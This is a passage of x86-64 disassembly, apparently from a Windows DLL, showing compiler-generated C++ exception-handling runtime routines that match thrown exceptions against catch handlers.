   1800037a9:	49 8b ce             	mov    %r14,%rcx
   1800037ac:	4d 8b c7             	mov    %r15,%r8
   1800037af:	49 8b d5             	mov    %r13,%rdx
   1800037b2:	e8 19 f3 ff ff       	call   0x180002ad0
   1800037b7:	48 8b f0             	mov    %rax,%rsi
   1800037ba:	48 85 ff             	test   %rdi,%rdi
   1800037bd:	74 16                	je     0x1800037d5
   1800037bf:	4c 8b cf             	mov    %rdi,%r9
   1800037c2:	4c 8d 84 24 c8 00 00 	lea    0xc8(%rsp),%r8
   1800037c9:	00 
   1800037ca:	48 8b d0             	mov    %rax,%rdx
   1800037cd:	48 8b cd             	mov    %rbp,%rcx
   1800037d0:	e8 cb fb ff ff       	call   0x1800033a0
   1800037d5:	48 63 9c 24 d4 00 00 	movslq 0xd4(%rsp),%rbx
   1800037dc:	00 
   1800037dd:	e8 ee f6 ff ff       	call   0x180002ed0
   1800037e2:	0f b6 8c 24 68 01 00 	movzbl 0x168(%rsp),%ecx
   1800037e9:	00 
   1800037ea:	48 03 c3             	add    %rbx,%rax
   1800037ed:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   1800037f2:	4c 8b ce             	mov    %rsi,%r9
   1800037f5:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   1800037f9:	48 8b d5             	mov    %rbp,%rdx
   1800037fc:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
   180003801:	48 8d 8c 24 c8 00 00 	lea    0xc8(%rsp),%rcx
   180003808:	00 
   180003809:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   18000380e:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   180003812:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   180003816:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   18000381a:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   18000381e:	49 8b ce             	mov    %r14,%rcx
   180003821:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   180003826:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000382b:	e8 d0 f4 ff ff       	call   0x180002d00
   180003830:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
   180003835:	4c 8b 4c 24 70       	mov    0x70(%rsp),%r9
   18000383a:	8b 5c 24 60          	mov    0x60(%rsp),%ebx
   18000383e:	eb 16                	jmp    0x180003856
   180003840:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
   180003845:	8b 5c 24 60          	mov    0x60(%rsp),%ebx
   180003849:	4c 8b 4c 24 70       	mov    0x70(%rsp),%r9
   18000384e:	4c 8b b4 24 80 00 00 	mov    0x80(%rsp),%r14
   180003855:	00 
   180003856:	41 ff c0             	inc    %r8d
   180003859:	44 89 44 24 64       	mov    %r8d,0x64(%rsp)
   18000385e:	44 3b 84 24 c0 00 00 	cmp    0xc0(%rsp),%r8d
   180003865:	00 
   180003866:	0f 82 44 fe ff ff    	jb     0x1800036b0
   18000386c:	45 33 e4             	xor    %r12d,%r12d
   18000386f:	41 8b 07             	mov    (%r15),%eax
   180003872:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   180003877:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   18000387c:	0f 82 fa 00 00 00    	jb     0x18000397c
   180003882:	49 63 5f 20          	movslq 0x20(%r15),%rbx
   180003886:	85 db                	test   %ebx,%ebx
   180003888:	74 0a                	je     0x180003894
   18000388a:	e8 41 f6 ff ff       	call   0x180002ed0
   18000388f:	48 03 c3             	add    %rbx,%rax
   180003892:	75 1e                	jne    0x1800038b2
   180003894:	41 f6 47 24 04       	testb  $0x4,0x24(%r15)
   180003899:	0f 84 dd 00 00 00    	je     0x18000397c
   18000389f:	49 8b d7             	mov    %r15,%rdx
   1800038a2:	49 8b cd             	mov    %r13,%rcx
   1800038a5:	e8 86 f0 ff ff       	call   0x180002930
   1800038aa:	84 c0                	test   %al,%al
   1800038ac:	0f 85 ca 00 00 00    	jne    0x18000397c
   1800038b2:	41 f6 47 24 04       	testb  $0x4,0x24(%r15)
   1800038b7:	0f 85 27 01 00 00    	jne    0x1800039e4
   1800038bd:	49 63 5f 20          	movslq 0x20(%r15),%rbx
   1800038c1:	85 db                	test   %ebx,%ebx
   1800038c3:	74 0b                	je     0x1800038d0
   1800038c5:	e8 06 f6 ff ff       	call   0x180002ed0
   1800038ca:	48 8d 14 03          	lea    (%rbx,%rax,1),%rdx
   1800038ce:	eb 03                	jmp    0x1800038d3
   1800038d0:	49 8b d4             	mov    %r12,%rdx
   1800038d3:	48 8b cd             	mov    %rbp,%rcx
   1800038d6:	e8 75 0c 00 00       	call   0x180004550
   1800038db:	84 c0                	test   %al,%al
   1800038dd:	0f 85 99 00 00 00    	jne    0x18000397c
   1800038e3:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
   1800038ea:	00 
   1800038eb:	4d 8b c7             	mov    %r15,%r8
   1800038ee:	49 8b d5             	mov    %r13,%rdx
   1800038f1:	49 8b ce             	mov    %r14,%rcx
   1800038f4:	e8 d7 f1 ff ff       	call   0x180002ad0
   1800038f9:	0f b6 8c 24 68 01 00 	movzbl 0x168(%rsp),%ecx
   180003900:	00 
   180003901:	4c 8b c8             	mov    %rax,%r9
   180003904:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   180003909:	48 8b d5             	mov    %rbp,%rdx
   18000390c:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   180003910:	49 8b ce             	mov    %r14,%rcx
   180003913:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
   180003918:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   18000391d:	c7 44 24 38 ff ff ff 	movl   $0xffffffff,0x38(%rsp)
   180003924:	ff 
   180003925:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%rsp)
   18000392c:	ff 
   18000392d:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   180003932:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180003937:	e8 c4 f3 ff ff       	call   0x180002d00
   18000393c:	eb 3e                	jmp    0x18000397c
   18000393e:	45 39 67 0c          	cmp    %r12d,0xc(%r15)
   180003942:	76 38                	jbe    0x18000397c
   180003944:	44 38 a4 24 68 01 00 	cmp    %r12b,0x168(%rsp)
   18000394b:	00 
   18000394c:	0f 85 af 00 00 00    	jne    0x180003a01
   180003952:	8b 84 24 70 01 00 00 	mov    0x170(%rsp),%eax
   180003959:	4d 8b cd             	mov    %r13,%r9
   18000395c:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180003961:	4c 8b c6             	mov    %rsi,%r8
   180003964:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003968:	49 8b d6             	mov    %r14,%rdx
   18000396b:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   18000396f:	48 8b cd             	mov    %rbp,%rcx
   180003972:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180003977:	e8 94 00 00 00       	call   0x180003a10
   18000397c:	e8 1f ec ff ff       	call   0x1800025a0
   180003981:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   180003986:	75 79                	jne    0x180003a01
   180003988:	4c 8b a4 24 f8 00 00 	mov    0xf8(%rsp),%r12
   18000398f:	00 
   180003990:	48 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%rcx
   180003997:	00 
   180003998:	48 33 cc             	xor    %rsp,%rcx
   18000399b:	e8 30 d9 ff ff       	call   0x1800012d0
   1800039a0:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   1800039a7:	41 5f                	pop    %r15
   1800039a9:	41 5e                	pop    %r14
   1800039ab:	41 5d                	pop    %r13
   1800039ad:	5f                   	pop    %rdi
   1800039ae:	5e                   	pop    %rsi
   1800039af:	5d                   	pop    %rbp
   1800039b0:	5b                   	pop    %rbx
   1800039b1:	c3                   	ret
   1800039b2:	b2 01                	mov    $0x1,%dl
   1800039b4:	48 8b cd             	mov    %rbp,%rcx
   1800039b7:	e8 44 e9 ff ff       	call   0x180002300
   1800039bc:	48 8d 8c 24 c8 00 00 	lea    0xc8(%rsp),%rcx
   1800039c3:	00 
   1800039c4:	e8 57 06 00 00       	call   0x180004020
   1800039c9:	48 8d 15 20 47 01 00 	lea    0x14720(%rip),%rdx        # 0x1800180f0
   1800039d0:	48 8d 8c 24 c8 00 00 	lea    0xc8(%rsp),%rcx
   1800039d7:	00 
   1800039d8:	e8 b3 0e 00 00       	call   0x180004890
   1800039dd:	cc                   	int3
   1800039de:	e8 cd 1f 00 00       	call   0x1800059b0
   1800039e3:	cc                   	int3
   1800039e4:	e8 b7 eb ff ff       	call   0x1800025a0
   1800039e9:	48 89 68 20          	mov    %rbp,0x20(%rax)
   1800039ed:	e8 ae eb ff ff       	call   0x1800025a0
   1800039f2:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1800039f7:	48 89 48 28          	mov    %rcx,0x28(%rax)
   1800039fb:	e8 b0 1f 00 00       	call   0x1800059b0
   180003a00:	cc                   	int3
   180003a01:	e8 6a 20 00 00       	call   0x180005a70
   180003a06:	cc                   	int3
   180003a07:	cc                   	int3
   180003a08:	cc                   	int3
   180003a09:	cc                   	int3
   180003a0a:	cc                   	int3
   180003a0b:	cc                   	int3
   180003a0c:	cc                   	int3
   180003a0d:	cc                   	int3
   180003a0e:	cc                   	int3
   180003a0f:	cc                   	int3
   180003a10:	48 8b c4             	mov    %rsp,%rax
   180003a13:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180003a17:	48 89 50 10          	mov    %rdx,0x10(%rax)
   180003a1b:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180003a1f:	56                   	push   %rsi
   180003a20:	41 55                	push   %r13
   180003a22:	41 56                	push   %r14
   180003a24:	41 57                	push   %r15
   180003a26:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
   180003a2d:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   180003a33:	4d 8b f1             	mov    %r9,%r14
   180003a36:	4d 8b e8             	mov    %r8,%r13
   180003a39:	4c 8b fa             	mov    %rdx,%r15
   180003a3c:	48 8b f1             	mov    %rcx,%rsi
   180003a3f:	0f 84 07 02 00 00    	je     0x180003c4c
   180003a45:	48 89 68 d8          	mov    %rbp,-0x28(%rax)
   180003a49:	48 89 78 d0          	mov    %rdi,-0x30(%rax)
   180003a4d:	4c 89 60 c8          	mov    %r12,-0x38(%rax)
   180003a51:	48 89 58 20          	mov    %rbx,0x20(%rax)
   180003a55:	e8 46 eb ff ff       	call   0x1800025a0
   180003a5a:	8b bc 24 10 01 00 00 	mov    0x110(%rsp),%edi
   180003a61:	8b ac 24 08 01 00 00 	mov    0x108(%rsp),%ebp
   180003a68:	4c 8b a4 24 00 01 00 	mov    0x100(%rsp),%r12
   180003a6f:	00 
   180003a70:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   180003a75:	74 59                	je     0x180003ad0
   180003a77:	e8 24 eb ff ff       	call   0x1800025a0
   180003a7c:	33 c9                	xor    %ecx,%ecx
   180003a7e:	48 8b 58 10          	mov    0x10(%rax),%rbx
   180003a82:	ff 15 40 b6 00 00    	call   *0xb640(%rip)        # 0x18000f0c8
   180003a88:	48 3b d8             	cmp    %rax,%rbx
   180003a8b:	74 43                	je     0x180003ad0
   180003a8d:	8b 06                	mov    (%rsi),%eax
   180003a8f:	3d 4d 4f 43 e0       	cmp    $0xe0434f4d,%eax
   180003a94:	74 3a                	je     0x180003ad0
   180003a96:	3d 52 43 43 e0       	cmp    $0xe0434352,%eax
   180003a9b:	74 33                	je     0x180003ad0
   180003a9d:	48 8b 84 24 18 01 00 	mov    0x118(%rsp),%rax
   180003aa4:	00 
   180003aa5:	4d 8b ce             	mov    %r14,%r9
   180003aa8:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   180003aac:	4d 8b c5             	mov    %r13,%r8
   180003aaf:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180003ab4:	49 8b d7             	mov    %r15,%rdx
   180003ab7:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180003abb:	48 8b ce             	mov    %rsi,%rcx
   180003abe:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180003ac3:	e8 18 ee ff ff       	call   0x1800028e0
   180003ac8:	85 c0                	test   %eax,%eax
   180003aca:	0f 85 5c 01 00 00    	jne    0x180003c2c
   180003ad0:	49 8b 46 08          	mov    0x8(%r14),%rax
   180003ad4:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   180003ad9:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   180003ade:	41 83 7c 24 0c 00    	cmpl   $0x0,0xc(%r12)
   180003ae4:	0f 86 71 01 00 00    	jbe    0x180003c5b
   180003aea:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180003aee:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180003af3:	4d 8b ce             	mov    %r14,%r9
   180003af6:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180003afb:	44 8b c5             	mov    %ebp,%r8d
   180003afe:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   180003b05:	00 
   180003b06:	e8 c5 f0 ff ff       	call   0x180002bd0
   180003b0b:	8b bc 24 88 00 00 00 	mov    0x88(%rsp),%edi
   180003b12:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   180003b19:	00 
   180003b1a:	3b bc 24 98 00 00 00 	cmp    0x98(%rsp),%edi
   180003b21:	0f 83 05 01 00 00    	jae    0x180003c2c
   180003b27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180003b2e:	00 00 
   180003b30:	49 8b 45 00          	mov    0x0(%r13),%rax
   180003b34:	48 63 50 10          	movslq 0x10(%rax),%rdx
   180003b38:	8b c7                	mov    %edi,%eax
   180003b3a:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180003b3e:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   180003b42:	4d 03 45 08          	add    0x8(%r13),%r8
   180003b46:	45 8b 38             	mov    (%r8),%r15d
   180003b49:	44 3b fd             	cmp    %ebp,%r15d
   180003b4c:	0f 8f cb 00 00 00    	jg     0x180003c1d
   180003b52:	41 3b 68 04          	cmp    0x4(%r8),%ebp
   180003b56:	0f 8f c1 00 00 00    	jg     0x180003c1d
   180003b5c:	41 8b 40 08          	mov    0x8(%r8),%eax
   180003b60:	49 8b 76 08          	mov    0x8(%r14),%rsi
   180003b64:	89 44 24 60          	mov    %eax,0x60(%rsp)
   180003b68:	48 83 c6 ec          	add    $0xffffffffffffffec,%rsi
   180003b6c:	41 8b 40 0c          	mov    0xc(%r8),%eax
   180003b70:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180003b74:	49 63 40 10          	movslq 0x10(%r8),%rax
   180003b78:	48 8d 14 88          	lea    (%rax,%rcx,4),%rdx
   180003b7c:	48 03 f2             	add    %rdx,%rsi
   180003b7f:	48 63 5e 04          	movslq 0x4(%rsi),%rbx
   180003b83:	85 db                	test   %ebx,%ebx
   180003b85:	74 24                	je     0x180003bab
   180003b87:	e8 44 f3 ff ff       	call   0x180002ed0
   180003b8c:	48 03 c3             	add    %rbx,%rax
   180003b8f:	74 1a                	je     0x180003bab
   180003b91:	48 63 5e 04          	movslq 0x4(%rsi),%rbx
   180003b95:	85 db                	test   %ebx,%ebx
   180003b97:	74 0a                	je     0x180003ba3
   180003b99:	e8 32 f3 ff ff       	call   0x180002ed0
   180003b9e:	48 03 c3             	add    %rbx,%rax
   180003ba1:	eb 02                	jmp    0x180003ba5
   180003ba3:	33 c0                	xor    %eax,%eax
   180003ba5:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   180003ba9:	75 72                	jne    0x180003c1d
   180003bab:	f6 06 40             	testb  $0x40,(%rsi)
   180003bae:	75 6d                	jne    0x180003c1d
   180003bb0:	48 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%rcx
   180003bb7:	00 
   180003bb8:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   180003bbd:	4d 8b c4             	mov    %r12,%r8
   180003bc0:	49 8b d6             	mov    %r14,%rdx
   180003bc3:	e8 08 ef ff ff       	call   0x180002ad0
   180003bc8:	48 8b d8             	mov    %rax,%rbx
   180003bcb:	e8 00 f3 ff ff       	call   0x180002ed0
   180003bd0:	48 63 4e 0c          	movslq 0xc(%rsi),%rcx
   180003bd4:	4c 8b cb             	mov    %rbx,%r9
   180003bd7:	4c 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%r8
   180003bde:	00 
   180003bdf:	48 03 c8             	add    %rax,%rcx
   180003be2:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180003be6:	48 8b 94 24 e0 00 00 	mov    0xe0(%rsp),%rdx
   180003bed:	00 
   180003bee:	c6 44 24 50 00       	movb   $0x0,0x50(%rsp)
   180003bf3:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   180003bf8:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   180003bfd:	89 44 24 38          	mov    %eax,0x38(%rsp)
   180003c01:	44 89 7c 24 30       	mov    %r15d,0x30(%rsp)
   180003c06:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   180003c0b:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180003c10:	48 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%rcx
   180003c17:	00 
   180003c18:	e8 e3 f0 ff ff       	call   0x180002d00
   180003c1d:	ff c7                	inc    %edi
   180003c1f:	3b bc 24 98 00 00 00 	cmp    0x98(%rsp),%edi
   180003c26:	0f 82 04 ff ff ff    	jb     0x180003b30
   180003c2c:	48 8b 9c 24 f8 00 00 	mov    0xf8(%rsp),%rbx
   180003c33:	00 
   180003c34:	48 8b ac 24 b0 00 00 	mov    0xb0(%rsp),%rbp
   180003c3b:	00 
   180003c3c:	48 8b bc 24 a8 00 00 	mov    0xa8(%rsp),%rdi
   180003c43:	00 
   180003c44:	4c 8b a4 24 a0 00 00 	mov    0xa0(%rsp),%r12
   180003c4b:	00 
   180003c4c:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
   180003c53:	41 5f                	pop    %r15
   180003c55:	41 5e                	pop    %r14
   180003c57:	41 5d                	pop    %r13
   180003c59:	5e                   	pop    %rsi
   180003c5a:	c3                   	ret
   180003c5b:	e8 10 1e 00 00       	call   0x180005a70
   180003c60:	cc                   	int3
   180003c61:	cc                   	int3
   180003c62:	cc                   	int3
   180003c63:	cc                   	int3
   180003c64:	cc                   	int3
   180003c65:	cc                   	int3
   180003c66:	cc                   	int3
   180003c67:	cc                   	int3
   180003c68:	cc                   	int3
   180003c69:	cc                   	int3
   180003c6a:	cc                   	int3
   180003c6b:	cc                   	int3
   180003c6c:	cc                   	int3
   180003c6d:	cc                   	int3
   180003c6e:	cc                   	int3
   180003c6f:	cc                   	int3
   180003c70:	40 53                	rex push %rbx
   180003c72:	55                   	push   %rbp
   180003c73:	57                   	push   %rdi
   180003c74:	41 56                	push   %r14
   180003c76:	48 83 ec 28          	sub    $0x28,%rsp
   180003c7a:	48 63 59 04          	movslq 0x4(%rcx),%rbx
   180003c7e:	4d 8b f0             	mov    %r8,%r14
   180003c81:	48 8b ea             	mov    %rdx,%rbp
   180003c84:	48 8b f9             	mov    %rcx,%rdi
   180003c87:	85 db                	test   %ebx,%ebx
   180003c89:	0f 84 f7 00 00 00    	je     0x180003d86
   180003c8f:	e8 3c f2 ff ff       	call   0x180002ed0
   180003c94:	48 03 c3             	add    %rbx,%rax
   180003c97:	0f 84 e9 00 00 00    	je     0x180003d86
   180003c9d:	48 63 5f 04          	movslq 0x4(%rdi),%rbx
   180003ca1:	85 db                	test   %ebx,%ebx
   180003ca3:	74 0a                	je     0x180003caf
   180003ca5:	e8 26 f2 ff ff       	call   0x180002ed0
   180003caa:	48 03 c3             	add    %rbx,%rax
   180003cad:	eb 02                	jmp    0x180003cb1
   180003caf:	33 c0                	xor    %eax,%eax
   180003cb1:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   180003cb5:	0f 84 cb 00 00 00    	je     0x180003d86
   180003cbb:	f6 07 80             	testb  $0x80,(%rdi)
   180003cbe:	74 0a                	je     0x180003cca
   180003cc0:	f6 45 00 10          	testb  $0x10,0x0(%rbp)
   180003cc4:	0f 85 bc 00 00 00    	jne    0x180003d86
   180003cca:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   180003ccf:	48 63 77 04          	movslq 0x4(%rdi),%rsi
   180003cd3:	85 f6                	test   %esi,%esi
   180003cd5:	74 0b                	je     0x180003ce2
   180003cd7:	e8 f4 f1 ff ff       	call   0x180002ed0
   180003cdc:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   180003ce0:	eb 02                	jmp    0x180003ce4
   180003ce2:	33 db                	xor    %ebx,%ebx
   180003ce4:	e8 07 f2 ff ff       	call   0x180002ef0
   180003ce9:	48 63 4d 04          	movslq 0x4(%rbp),%rcx
   180003ced:	48 03 c8             	add    %rax,%rcx
   180003cf0:	48 3b d9             	cmp    %rcx,%rbx
   180003cf3:	74 54                	je     0x180003d49
   180003cf5:	48 63 5f 04          	movslq 0x4(%rdi),%rbx
   180003cf9:	85 db                	test   %ebx,%ebx
   180003cfb:	74 0b                	je     0x180003d08
   180003cfd:	e8 ce f1 ff ff       	call   0x180002ed0
   180003d02:	48 8d 34 18          	lea    (%rax,%rbx,1),%rsi
   180003d06:	eb 02                	jmp    0x180003d0a
   180003d08:	33 f6                	xor    %esi,%esi
   180003d0a:	48 63 5d 04          	movslq 0x4(%rbp),%rbx
   180003d0e:	e8 dd f1 ff ff       	call   0x180002ef0
   180003d13:	4c 8d 43 10          	lea    0x10(%rbx),%r8
   180003d17:	4c 03 c0             	add    %rax,%r8
   180003d1a:	48 8d 46 10          	lea    0x10(%rsi),%rax
   180003d1e:	4c 2b c0             	sub    %rax,%r8
   180003d21:	0f b6 10             	movzbl (%rax),%edx
   180003d24:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   180003d29:	2b d1                	sub    %ecx,%edx
   180003d2b:	75 07                	jne    0x180003d34
   180003d2d:	48 ff c0             	inc    %rax
   180003d30:	85 c9                	test   %ecx,%ecx
   180003d32:	75 ed                	jne    0x180003d21
   180003d34:	85 d2                	test   %edx,%edx
   180003d36:	74 11                	je     0x180003d49
   180003d38:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180003d3d:	33 c0                	xor    %eax,%eax
   180003d3f:	48 83 c4 28          	add    $0x28,%rsp
   180003d43:	41 5e                	pop    %r14
   180003d45:	5f                   	pop    %rdi
   180003d46:	5d                   	pop    %rbp
   180003d47:	5b                   	pop    %rbx
   180003d48:	c3                   	ret
   180003d49:	f6 45 00 02          	testb  $0x2,0x0(%rbp)
   180003d4d:	74 05                	je     0x180003d54
   180003d4f:	f6 07 08             	testb  $0x8,(%rdi)
   180003d52:	74 e4                	je     0x180003d38
   180003d54:	41 8b 06             	mov    (%r14),%eax
   180003d57:	a8 01                	test   $0x1,%al
   180003d59:	74 05                	je     0x180003d60
   180003d5b:	f6 07 01             	testb  $0x1,(%rdi)
   180003d5e:	74 d8                	je     0x180003d38
   180003d60:	a8 04                	test   $0x4,%al
   180003d62:	74 05                	je     0x180003d69
   180003d64:	f6 07 04             	testb  $0x4,(%rdi)
   180003d67:	74 cf                	je     0x180003d38
   180003d69:	a8 02                	test   $0x2,%al
   180003d6b:	74 05                	je     0x180003d72
   180003d6d:	f6 07 02             	testb  $0x2,(%rdi)
   180003d70:	74 c6                	je     0x180003d38
   180003d72:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180003d77:	b8 01 00 00 00       	mov    $0x1,%eax
   180003d7c:	48 83 c4 28          	add    $0x28,%rsp
   180003d80:	41 5e                	pop    %r14
   180003d82:	5f                   	pop    %rdi
   180003d83:	5d                   	pop    %rbp
   180003d84:	5b                   	pop    %rbx
   180003d85:	c3                   	ret
   180003d86:	b8 01 00 00 00       	mov    $0x1,%eax
   180003d8b:	48 83 c4 28          	add    $0x28,%rsp
   180003d8f:	41 5e                	pop    %r14
   180003d91:	5f                   	pop    %rdi
   180003d92:	5d                   	pop    %rbp
   180003d93:	5b                   	pop    %rbx
   180003d94:	c3                   	ret
   180003d95:	cc                   	int3
   180003d96:	cc                   	int3
   180003d97:	cc                   	int3
   180003d98:	cc                   	int3
   180003d99:	cc                   	int3
   180003d9a:	cc                   	int3
   180003d9b:	cc                   	int3
   180003d9c:	cc                   	int3
   180003d9d:	cc                   	int3
   180003d9e:	cc                   	int3
   180003d9f:	cc                   	int3
   180003da0:	40 53                	rex push %rbx
   180003da2:	55                   	push   %rbp
   180003da3:	56                   	push   %rsi
   180003da4:	57                   	push   %rdi
   180003da5:	41 56                	push   %r14
   180003da7:	41 57                	push   %r15
   180003da9:	48 83 ec 58          	sub    $0x58,%rsp
   180003dad:	48 8b f9             	mov    %rcx,%rdi
   180003db0:	49 8b f1             	mov    %r9,%rsi
   180003db3:	49 8b c8             	mov    %r8,%rcx
   180003db6:	4d 8b f8             	mov    %r8,%r15
   180003db9:	4c 8b f2             	mov    %rdx,%r14
   180003dbc:	e8 1f e7 ff ff       	call   0x1800024e0
   180003dc1:	e8 da e7 ff ff       	call   0x1800025a0
   180003dc6:	48 8b 9c 24 b0 00 00 	mov    0xb0(%rsp),%rbx
   180003dcd:	00 
   180003dce:	83 78 40 00          	cmpl   $0x0,0x40(%rax)
   180003dd2:	75 3f                	jne    0x180003e13
   180003dd4:	8b 07                	mov    (%rdi),%eax
   180003dd6:	3d 63 73 6d e0       	cmp    $0xe06d7363,%eax
   180003ddb:	74 36                	je     0x180003e13
   180003ddd:	3d 29 00 00 80       	cmp    $0x80000029,%eax
   180003de2:	75 10                	jne    0x180003df4
   180003de4:	83 7f 18 0f          	cmpl   $0xf,0x18(%rdi)
   180003de8:	75 11                	jne    0x180003dfb
   180003dea:	48 81 7f 60 20 05 93 	cmpq   $0x19930520,0x60(%rdi)
   180003df1:	19 
   180003df2:	eb 05                	jmp    0x180003df9
   180003df4:	3d 26 00 00 80       	cmp    $0x80000026,%eax
   180003df9:	74 18                	je     0x180003e13
   180003dfb:	8b 03                	mov    (%rbx),%eax
   180003dfd:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   180003e02:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   180003e07:	72 0a                	jb     0x180003e13
   180003e09:	f6 43 24 01          	testb  $0x1,0x24(%rbx)
   180003e0d:	0f 85 9e 01 00 00    	jne    0x180003fb1
   180003e13:	8b 47 04             	mov    0x4(%rdi),%eax
   180003e16:	a8 66                	test   $0x66,%al
   180003e18:	0f 84 a2 00 00 00    	je     0x180003ec0
   180003e1e:	8b 4b 04             	mov    0x4(%rbx),%ecx
   180003e21:	85 c9                	test   %ecx,%ecx
   180003e23:	0f 84 88 01 00 00    	je     0x180003fb1
   180003e29:	83 bc 24 b8 00 00 00 	cmpl   $0x0,0xb8(%rsp)
   180003e30:	00 
   180003e31:	0f 85 7a 01 00 00    	jne    0x180003fb1
   180003e37:	a8 20                	test   $0x20,%al
   180003e39:	74 72                	je     0x180003ead
   180003e3b:	8b 07                	mov    (%rdi),%eax
   180003e3d:	3d 26 00 00 80       	cmp    $0x80000026,%eax
   180003e42:	75 37                	jne    0x180003e7b
   180003e44:	4c 8b 46 20          	mov    0x20(%rsi),%r8
   180003e48:	48 8b d6             	mov    %rsi,%rdx
   180003e4b:	48 8b cb             	mov    %rbx,%rcx
   180003e4e:	e8 fd f2 ff ff       	call   0x180003150
   180003e53:	83 f8 ff             	cmp    $0xffffffff,%eax
   180003e56:	0f 8c 67 01 00 00    	jl     0x180003fc3
   180003e5c:	3b 43 04             	cmp    0x4(%rbx),%eax
   180003e5f:	0f 8d 5e 01 00 00    	jge    0x180003fc3
   180003e65:	44 8b c8             	mov    %eax,%r9d
   180003e68:	4c 8b c3             	mov    %rbx,%r8
   180003e6b:	48 8b d6             	mov    %rsi,%rdx
   180003e6e:	49 8b ce             	mov    %r14,%rcx
   180003e71:	e8 2a 05 00 00       	call   0x1800043a0
   180003e76:	e9 36 01 00 00       	jmp    0x180003fb1
   180003e7b:	3d 29 00 00 80       	cmp    $0x80000029,%eax
   180003e80:	75 2b                	jne    0x180003ead
   180003e82:	44 8b 4f 38          	mov    0x38(%rdi),%r9d
   180003e86:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   180003e8a:	0f 8c 33 01 00 00    	jl     0x180003fc3
   180003e90:	44 3b c9             	cmp    %ecx,%r9d
   180003e93:	0f 8d 2a 01 00 00    	jge    0x180003fc3
   180003e99:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   180003e9d:	4c 8b c3             	mov    %rbx,%r8
   180003ea0:	48 8b d6             	mov    %rsi,%rdx
   180003ea3:	e8 f8 04 00 00       	call   0x1800043a0
   180003ea8:	e9 04 01 00 00       	jmp    0x180003fb1
   180003ead:	4c 8b c3             	mov    %rbx,%r8
   180003eb0:	48 8b d6             	mov    %rsi,%rdx
   180003eb3:	49 8b ce             	mov    %r14,%rcx
   180003eb6:	e8 e5 ea ff ff       	call   0x1800029a0
   180003ebb:	e9 f1 00 00 00       	jmp    0x180003fb1
   180003ec0:	83 7b 0c 00          	cmpl   $0x0,0xc(%rbx)
   180003ec4:	75 3c                	jne    0x180003f02
   180003ec6:	8b 03                	mov    (%rbx),%eax
   180003ec8:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
   180003ecd:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   180003ed2:	72 12                	jb     0x180003ee6
   180003ed4:	48 63 6b 20          	movslq 0x20(%rbx),%rbp
